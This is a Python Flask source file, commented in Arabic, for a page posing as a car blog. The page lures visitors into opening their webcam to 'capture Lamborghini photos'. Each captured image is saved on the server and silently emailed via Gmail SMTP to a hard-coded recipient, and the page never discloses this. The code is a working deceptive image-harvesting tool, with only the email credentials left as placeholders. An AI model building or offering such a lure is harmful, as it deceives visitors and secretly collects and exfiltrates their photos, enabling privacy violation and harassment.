from flask import Flask, request, render_template, send_from_directory
import smtplib
import os
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

EMAIL_ADDRESS = "your_email@gmail.com"  # استبدل ببريدك الإلكتروني
EMAIL_PASSWORD = "your_email_password"  # استبدل بكلمة مرور البريد أو استخدم كلمة مرور التطبيقات
RECIPIENT_EMAIL = "recipient_email@gmail.com"  # استبدل بالبريد الذي تريد إرسال الصور إليه

app = Flask(__name__)

# تخزين الصور
UPLOAD_FOLDER = "static/uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>مدونة السيارات</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
            .container { max-width: 600px; margin: auto; }
            .article { background: #f4f4f4; padding: 20px; margin-top: 20px; border-radius: 10px; cursor: pointer; }
            .article:hover { background: #ddd; }
        </style>
    </head>
    <body>
        <h1>مرحبًا بك في مدونة السيارات!</h1>
        <div class="container">
            <p>استمتع بمقالاتنا حول السيارات الفاخرة وأحدث الموديلات.</p>
            <div class="article" onclick="window.location.href='/capture'">
                <h2>التقاط صور لامبرغيني</h2>
                <p>اضغط هنا لاكتشاف أحدث صور لامبرغيني والتقاط صورة بنفسك!</p>
            </div>
        </div>
    </body>
    </html>
    '''


@app.route('/capture')
def capture():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>التقاط صورة</title>
    </head>
    <body>
        <h1>📷 الكاميرا</h1>
        <video id="video" width="640" height="480" autoplay></video>
        <button id="capture">📷 التقاط الصورة</button>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        <form id="uploadForm" method="POST" enctype="multipart/form-data" action="/upload">
            <input type="file" name="image" id="imageInput" style="display:none;">
            <input type="submit" value="Upload" style="display:none;">
        </form>
        <script>
            let video = document.getElementById('video');
            let canvas = document.getElementById('canvas');
            let captureButton = document.getElementById('capture');
            let uploadForm = document.getElementById('uploadForm');
            let imageInput = document.getElementById('imageInput');

            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                video.srcObject = stream;
            });

            captureButton.addEventListener('click', () => {
                let context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(blob => {
                    let file = new File([blob], 'capture.jpg', { type: 'image/jpeg' });
                    let dataTransfer = new DataTransfer();
                    dataTransfer.items.add(file);
                    imageInput.files = dataTransfer.files;
                    uploadForm.submit();
                }, 'image/jpeg');
            });
        </script>
    </body>
    </html>
    '''


@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['image']
    filename = f"{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)

    # إرسال الصورة عبر البريد الإلكتروني
    send_email(filepath)

    return "تم الرفع والإرسال بنجاح!"


def send_email(filepath):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = "📸 صورة تم التقاطها"

    with open(filepath, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename={os.path.basename(filepath)}",
        )
        msg.attach(part)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
    server.quit()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
